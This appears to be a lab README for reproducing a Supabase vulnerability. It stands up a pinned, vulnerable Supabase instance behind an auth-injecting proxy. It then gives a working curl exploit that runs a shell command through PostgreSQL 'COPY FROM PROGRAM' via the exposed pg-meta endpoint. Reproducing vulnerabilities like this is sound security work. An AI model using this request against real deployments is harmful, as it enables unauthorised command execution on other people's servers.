# Start Vulnerable instance
```bash
git clone https://github.com/supabase/supabase
pushd supabase
git checkout d83ef08ea1aa661ead1af970a094c512319863f8
popd
mkdir supabase-project
cp -rf supabase/docker/* supabase-project
cp supabase/docker/.env.example supabase-project/.env
cd supabase-project
wget https://github.com/caddyserver/caddy/releases/download/v2.8.4/caddy_2.8.4_linux_amd64.tar.gz && tar -zxvf caddy_2.8.4_linux_amd64.tar.gz  caddy && rm caddy_2.8.4_linux_amd64.tar.gz && chmod +x caddy
./caddy reverse-proxy --from :8001 --to http://localhost:8000 --header-up "Authorization: Basic c3VwYWJhc2U6dGhpc19wYXNzd29yZF9pc19pbnNlY3VyZV9hbmRfc2hvdWxkX2JlX3VwZGF0ZWQ=" --access-log &
docker compose pull
docker compose up 

```

# Access the exposed UI
Open your browser and navigate to `http://localhost:8001` to access the Supabase Exposed UI. Open `http://localhost:8000` to access the Supabase UI, username is `supabase` and password is `this_password_is_insecure_and_should_be_updated`
# Use the following command to run the exploit
```bash
curl 'http://127.0.0.1:8001/api/platform/pg-meta/default/query?key=' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'x-connection-encrypted: ' \
  --data-raw $'{"query":"CREATE TABLE filelist (filename text);\\nCOPY filelist FROM PROGRAM \'uname -a\';\\nSELECT * FROM filelist;","disable_statement_timeout":true}'

# cleanup
curl 'http://127.0.0.1:8001/api/platform/pg-meta/default/query?key=' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'x-connection-encrypted: ' \
  --data-raw $'{"query":"drop table filelist","disable_statement_timeout":true}'
```